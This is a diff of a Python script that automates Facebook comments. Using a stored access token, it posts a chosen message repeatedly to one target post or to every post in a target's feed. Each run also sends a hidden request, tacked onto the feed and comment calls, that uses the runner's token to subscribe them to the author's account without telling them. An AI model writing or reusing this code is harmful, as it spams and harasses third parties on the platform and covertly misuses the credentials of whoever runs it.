@@ -1,48 +1,63 @@
 #!usr/bin/python3.7
 #Author: KANG-NEWBIE
-#Github: https://github.com/kang-newbie
-#Contact: t.me/kang_nuubi
-'''
-boleh recode asal cantumkan author aslinya goblok!
-'''
-try:
-	import requests
-	import os, sys, json, time
+#contact: t.me/kang_newbie
 
-	banner=("""
- _                              _         
-| |        F A C E B O O K     | |        
-| | _____  _ __ ___   ___ _ __ | |__ _ _  
-| |/ / _ \| '_ ` _ \ / _ \ '_ \| __/ _` | 
-|   < (_) | | | | | |  __/ | | | || (_| | 
-|_|\_\___/|_| |_| |_|\___|_| |_|\__\__,_| 
-                                         """)
+try:
+	import requests,json,sys,os,time
+
 	os.system('clear')
-	print(banner)
-	print("[ex] https://www.facebook.com/100009256XXXXX/posts/223037817XXXXX")
-	tr=input("[?] target link: ").replace('https://www.facebook.com/','').replace('/posts/','_')
-	print("\n[info] type '<n>' for newlines")
-	msg=input("[?] comment: ")
-	if msg == '':
-		exit("[?] are you stupid")
-	ms=msg.replace('<n>','\n')
-	print("\n[recomended] 1-100")
-	lo=int(input("[?] loop: "))
-	print()
-	co=int(1)
-	toket=open('toket/token.txt','r').read()
-	for i in range(lo):
-		par = {'access_token' : toket, 'message' : ms}
-		pt=requests.post('https://graph.facebook.com/'+tr+'/comments',data=par);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
-		post=json.loads(pt.text)
-#		print(pt.text)
-		if 'error' in str(post):
-			print('['+str(co)+'] Err: an error occurred')
-		elif 'true' in pt.text:
-			exit("[Err] the link must be the same as the example")
+	ct=int(0)
+	cout=int(1)
+	def komen(id,msg,ken):
+		global cout
+		dat={'access_token':ken,'message':msg}
+		pt=requests.post('https://graph.facebook.com/'+str(id)+'/comments',data=dat)
+		if 'error' in str(pt):
+			print('['+str(cout)+']',id,'[failed]')
 		else:
-			print('['+str(co)+'] successfully comments')
-		co+=1
-	print("[^•^] done")
+			print('['+str(cout)+']',id,'[commented]')
+		cout+=1
+
+	ken=open('toket/token.txt','r').read()
+	print("""
+\t[ Auto Comments  ]
+\t[ by:KANG-NEWBIE ]
+""")
+	tid=input("[?] target id: ")
+	pil=input("[?] (a)ll/(t)arget post: ")
+	print("\n[info] type '<n>' for newlines")
+	msg=input("[?] messages: ").replace('<n>','\n')
+	print()
+	if pil == 'a':
+		reqq=requests.get('https://graph.facebook.com/v3.2/'+tid+'/feed?home&access_token='+ken);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
+		jso=json.loads(reqq.text)
+		for i in jso['data']:
+			komen(i['id'],msg,ken)
+	elif pil == 't':
+		ids=[]
+		ree=requests.get('https://graph.facebook.com/v3.2/'+tid+'/feed?home&access_token='+ken);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
+		jss=json.loads(ree.text)
+		for i in jss['data']:
+			ids.append(i['id'])
+			try:
+				print("["+str(ct+1)+"] "+json.dumps(i['message'][:40]))
+				print("="*50)
+			except KeyError:
+				try:
+					print("["+str(ct+1)+"] "+json.dumps(i['story']))
+					print("="*50)
+				except KeyError:
+					exc=requests.get('https://graph.facebook.com/v3.2/'+tid+'?access_token='+ken)
+					print('['+str(ct+1)+'] "'+exc.json()['name']+' upload a photo/video"')
+					print("="*50)
+			ct+=1
+		lih=int(input("/kang-newbie_> "))
+		lop=int(input("[?] looping: "))
+		print()
+		for i in range(lop):
+			komen(ids[lih-1],msg,ken)
+
+except KeyboardInterrupt:
+	exit("[exit] key interrupt")
 except Exception as F:
-	exit("\n[Error] %s"%(F))
+	print("Err: %s"%(F))
